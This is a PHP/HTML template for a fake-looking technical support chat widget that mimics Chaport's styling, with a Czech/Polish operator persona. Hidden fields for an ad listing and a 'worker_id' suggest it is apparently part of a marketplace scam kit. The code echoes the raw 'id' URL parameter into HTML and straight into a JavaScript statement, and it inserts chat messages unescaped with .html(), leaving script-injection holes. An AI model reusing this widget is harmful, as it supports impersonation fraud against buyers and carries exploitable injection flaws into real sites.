.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #464646;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #464646;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>
<div id="offonthechap">
<div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
<div class="chaport-launcher" style="left: 0px; right: 0px;">
<div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
<div class="chaport-launcher-chat-icon"></div>
<input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
<div class="chaport-launcher-close-icon"></div>
<div class="chaport-launcher-operator-photo"></div>
</div>
</div>
<div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
<div class="chaport-inner">
<div class="main-textblock">
<div class="operatorblock">
<div class="operatorblock-content" style="display: flex;">
<div id="operator-photo">
<img id="oper-photo-img" src="./expo_files/operator-img.png">
<div class="operator-name">Sofia</div>
</div>
<div class="team-wrapper">
<div class="team">Technická podpora</div>
<div class="activity-indicator">
<div class="with-status" style="display: inline-block;">
<div class="status-online" style="display: inline-block;">
</div>online</div>
</div>
</div>
</div>
</div>
<div class="chat-block">
<div id="chat">
<div class="operators-msg" id="greeting-msg" style="display: none;">
<div class="operators-photo"><img src="./expo_files/operator-img.png"></div>
<div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>
</div>
</div>
<div id="input-msg" style="display: flex;">
<input type="text" name="smstosup1" id="smstosup1" placeholder="Wnapište svou zprávu...">
<button id="smstosupbutton1" onclick="sendMessage()">
<div class="chaport-send-icon">
<svg width="18" height="18" viewBox="0 0 535.5 535.5">
<polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">
</polygon>
</svg>
</div>
</button>
</div>
</div>
</div>
</div>
</div>
<div class="chaport-big-shadow"></div>
</div>
</div>
<script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</div></body></html>